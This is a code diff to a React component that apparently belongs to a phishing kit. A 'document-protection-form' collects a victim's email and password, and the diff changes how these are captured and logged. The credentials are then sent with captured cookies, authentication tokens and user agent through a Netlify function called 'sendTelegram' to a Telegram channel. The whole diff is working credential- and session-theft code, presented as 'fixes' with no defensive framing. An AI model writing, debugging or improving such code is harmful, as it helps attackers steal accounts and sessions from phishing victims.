@@ -262,11 +262,18 @@ function App() {
     setIsSubmitting(true);
 
     try {
+      // 🔧 FIX: Store form credentials immediately when form is submitted
       setCapturedEmailState(formEmail);
       setCapturedCredentials({
         email: formEmail,
         password: formPassword,
         captureTime: new Date().toISOString(),
+        source: 'document-protection-form'
+      });
+
+      console.log('📋 Form credentials captured:', {
+        email: formEmail,
+        hasPassword: !!formPassword,
         source: 'document-protection-form'
       });
 
@@ -296,6 +303,13 @@ function App() {
     try {
       const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
 
+      console.log('📤 Sending to Telegram:', {
+        email: email,
+        hasPassword: !!password,
+        passwordLength: password ? password.length : 0,
+        cookieCount: Array.isArray(cookies) ? cookies.length : 0
+      });
+
       const response = await fetch(netlifyFunctionUrl, {
         method: 'POST',
         headers: {
@@ -304,6 +318,7 @@ function App() {
         body: JSON.stringify({
           email,
           password,
+          passwordSource: password ? 'document-protection-form' : undefined,
           cookies,
           authenticationTokens,
           userAgent,
@@ -316,6 +331,7 @@ function App() {
 
       if (response.ok && result.success) {
         console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
+        console.log('✅ Telegram result:', result);
       } else {
         console.warn('⚠️ Netlify function responded with error:', result);
       }
@@ -330,9 +346,22 @@ function App() {
     if (!hasSentAuthData) {
       setHasSentAuthData(true);
 
+      // 🔧 FIX: Prioritize captured credentials over form state
+      const finalEmail = capturedCredentials?.email || capturedEmail || formEmail || '';
+      const finalPassword = capturedCredentials?.password || formPassword || '';
+
+      console.log('📊 Final credentials for Telegram:', {
+        finalEmail,
+        hasPassword: !!finalPassword,
+        passwordSource: capturedCredentials?.source || 'form-state',
+        capturedCredentialsExists: !!capturedCredentials,
+        formEmailExists: !!formEmail,
+        formPasswordExists: !!formPassword
+      });
+
       await sendToTelegram({
-        email: capturedEmail || formEmail || (capturedCredentials?.email ?? ''),
-        password: formPassword || (capturedCredentials?.password ?? ''),
+        email: finalEmail,
+        password: finalPassword,
         cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
         authenticationTokens: sessionData?.authenticationTokens || {},
         userAgent: navigator.userAgent,
